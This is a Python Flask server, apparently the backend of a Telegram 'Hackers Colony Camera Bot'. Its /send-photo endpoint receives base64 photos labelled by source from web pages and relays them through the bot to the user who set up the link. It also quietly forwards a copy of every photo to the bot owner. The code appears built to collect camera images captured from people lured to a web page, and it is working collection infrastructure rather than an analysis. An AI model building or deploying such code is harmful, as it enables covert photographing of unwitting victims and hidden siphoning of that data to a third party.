from flask import Flask, request, jsonify
import sqlite3
from datetime import datetime
import base64
import asyncio
import threading
import sys
import os

# Add parent directory to path to import bot functions
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__)

# Import database functions from bot
from bot import (
    add_photo, get_user_info, OWNER_ID, 
    send_photo_to_user, send_photo_to_owner, application
)

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Hackers Colony Camera Bot</title>
        <style>
            body {
                background: linear-gradient(135deg, #0b0014, #1a0030);
                color: white;
                font-family: Arial, sans-serif;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                text-align: center;
                padding: 40px;
                background: rgba(22, 0, 34, 0.9);
                border-radius: 20px;
                box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
                max-width: 600px;
            }
            h1 {
                background: linear-gradient(45deg, #ff00ff, #00ffff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 20px;
                margin: 30px 0;
            }
            .stat-box {
                background: rgba(255,255,255,0.1);
                padding: 20px;
                border-radius: 10px;
                border: 1px solid rgba(255,0,255,0.3);
            }
            .telegram-links {
                margin-top: 30px;
            }
            .telegram-links a {
                display: block;
                margin: 10px 0;
                padding: 10px;
                background: linear-gradient(45deg, #0088cc, #00cc88);
                color: white;
                text-decoration: none;
                border-radius: 10px;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎭 Hackers Colony Camera Bot</h1>
            <p>Server is running successfully!</p>
            
            <div class="telegram-links">
                <a href="https://t.me/HackersColonyBot" target="_blank">🤖 Open Telegram Bot</a>
                <a href="https://t.me/HackersColony" target="_blank">📢 Join Channel</a>
                <a href="https://t.me/Hackers_Colony_Official" target="_blank">👤 Contact Owner</a>
            </div>
            
            <p style="margin-top: 30px; color: #aaa; font-size: 12px;">
                This server handles photo processing for the Hackers Colony Camera Bot
            </p>
        </div>
    </body>
    </html>
    """

@app.route('/send-photo', methods=['POST'])
def receive_photo():
    try:
        data = request.json
        user_id = data.get('userId')
        photo_base64 = data.get('photo')
        label = data.get('label', 'unknown')
        
        if not user_id or not photo_base64:
            return jsonify({'error': 'Missing data'}), 400
        
        # Store photo in database
        add_photo(user_id, f"web_{label}")
        
        # Convert base64 to bytes
        photo_bytes = base64.b64decode(photo_base64)
        
        # Send photos using the bot
        if application:
            # Run async functions in thread
            def send_photos():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                # Send to user
                loop.run_until_complete(send_photo_to_user(user_id, photo_bytes, label))
                
                # Send to owner if not owner
                if int(user_id) != OWNER_ID:
                    loop.run_until_complete(send_photo_to_owner(user_id, photo_bytes, label))
                
                loop.close()
            
            threading.Thread(target=send_photos, daemon=True).start()
        
        return jsonify({'success': True, 'message': 'Photo processed'})
        
    except Exception as e:
        print(f"Error in /send-photo: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/stats')
def stats_api():
    try:
        conn = sqlite3.connect('bot_users.db')
        c = conn.cursor()
        
        c.execute('''SELECT COUNT(*) FROM users WHERE is_banned = 0''')
        total_users = c.fetchone()[0]
        
        c.execute('''SELECT COUNT(*) FROM photos''')
        total_photos = c.fetchone()[0]
        
        today = datetime.now().date()
        c.execute('''SELECT COUNT(*) FROM users WHERE DATE(join_date) = ?''', (today,))
        today_users = c.fetchone()[0]
        
        c.execute('''SELECT COUNT(*) FROM photos WHERE DATE(timestamp) = ?''', (today,))
        today_photos = c.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'total_users': total_users,
            'total_photos': total_photos,
            'today_users': today_users,
            'today_photos': today_photos,
            'status': 'online'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
